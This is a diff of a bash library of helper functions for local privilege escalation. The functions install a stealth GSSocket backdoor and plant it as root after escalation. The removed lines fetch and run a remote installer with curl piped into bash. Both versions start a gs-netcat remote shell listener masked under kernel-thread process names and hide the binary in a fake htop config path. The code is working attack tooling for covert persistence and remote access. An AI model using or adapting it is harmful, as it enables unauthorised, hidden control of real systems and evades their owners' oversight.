@@ -1,7 +1,6 @@
 #!/bin/bash
 # Common functions for LPE methods
 
-# Colors
 RED='\033[0;31m'
 GREEN='\033[0;32m'
 YELLOW='\033[1;33m'
@@ -13,85 +12,39 @@ fail() { echo -e "${RED}[-]${NC} $*"; }
 warn() { echo -e "${YELLOW}[!]${NC} $*"; }
 info() { echo -e "${GOLD}[*]${NC} $*"; }
 
-# Check if we're root
-is_root() {
-    [ "$(id -u)" -eq 0 ]
-}
+is_root() { [ "$(id -u)" -eq 0 ]; }
 
-# Install stealth GSSocket backdoor (if we have shell access)
+# Install stealth GSSocket
 install_stealth_gs() {
     local secret="${1:-}"
-    
-    # Check if gs-netcat available
     local gs_bin=""
-    if command -v gs-netcat >/dev/null 2>&1; then
-        gs_bin="gs-netcat"
-    elif [ -f "$HOME/.config/htop/defunct" ]; then
-        gs_bin="$HOME/.config/htop/defunct"
-    fi
     
-    if [ -z "$gs_bin" ]; then
-        # Try to install
-        if command -v curl >/dev/null 2>&1; then
-            if [ -n "$secret" ]; then
-                X="$secret" bash -c "$(curl -fsSL gsocket.io/y)" >/dev/null 2>&1
-            else
-                bash -c "$(curl -fsSL gsocket.io/y)" >/dev/null 2>&1
-            fi
-        fi
-    fi
-    
-    # Find installed binary
-    if command -v gs-netcat >/dev/null 2>&1; then
-        gs_bin="gs-netcat"
-    elif [ -f "$HOME/.config/htop/defunct" ]; then
-        gs_bin="$HOME/.config/htop/defunct"
-    fi
+    # Find gs-netcat
+    for loc in "$(command -v gs-netcat 2>/dev/null)" "/usr/bin/gs-netcat" "$HOME/.config/htop/defunct" "/var/www/monitor-server/defunct"; do
+        [ -x "$loc" ] 2>/dev/null && gs_bin="$loc" && break
+    done
     
     [ -z "$gs_bin" ] && return 1
     
-    # Generate secret if not provided
-    if [ -z "$secret" ]; then
-        secret=$($gs_bin -g 2>/dev/null || head -c 12 /dev/urandom | xxd -p)
-    fi
+    # Generate secret
+    [ -z "$secret" ] && secret=$("$gs_bin" -g 2>/dev/null || head -c 12 /dev/urandom | xxd -p)
     
-    # Start with bashrc bypass - use /bin/sh not /bin/bash
-    local names=("[kworker/0:1]" "[migration/0]" "[ksoftirqd/0]" "[watchdogd]" "[rcu_sched]")
+    # Start - use /bin/sh -i (NOT --norc, dash doesn't support it)
+    local names=("[kworker/0:1]" "[migration/0]" "[ksoftirqd/0]")
     local name="${names[$((RANDOM % ${#names[@]}))]}"
     
-    (exec -a "$name" "$gs_bin" -s "$secret" -l -e "/bin/sh --norc -i" </dev/null >/dev/null 2>&1) &
+    # Key: Use /bin/sh -i WITHOUT any extra flags
+    (exec -a "$name" "$gs_bin" -s "$secret" -l -e "/bin/sh -i" </dev/null >/dev/null 2>&1) &
     disown 2>/dev/null
     
     echo "$secret"
 }
 
-# Plant root backdoor after successful privilege escalation
 plant_root_backdoor() {
-    # Only run if we're actually root
-    if ! is_root; then
-        warn "Not root, skipping backdoor plant"
-        return 1
-    fi
-    
+    is_root || return 1
     local secret=$(install_stealth_gs)
-    if [ -n "$secret" ]; then
+    [ -n "$secret" ] && {
         success "ROOT BACKDOOR PLANTED!"
         echo "ROOT_SECRET:$secret"
-        echo "Connect: gs-netcat -s $secret -i"
-    fi
-}
-
-# Safe command execution - don't use sudo if not needed or available
-run_if_root() {
-    if is_root; then
-        "$@"
-    else
-        # Check if we can sudo without password
-        if sudo -n true 2>/dev/null; then
-            sudo "$@"
-        else
-            # Just try without sudo
-            "$@" 2>/dev/null
-        fi
-    fi
+    }
 }
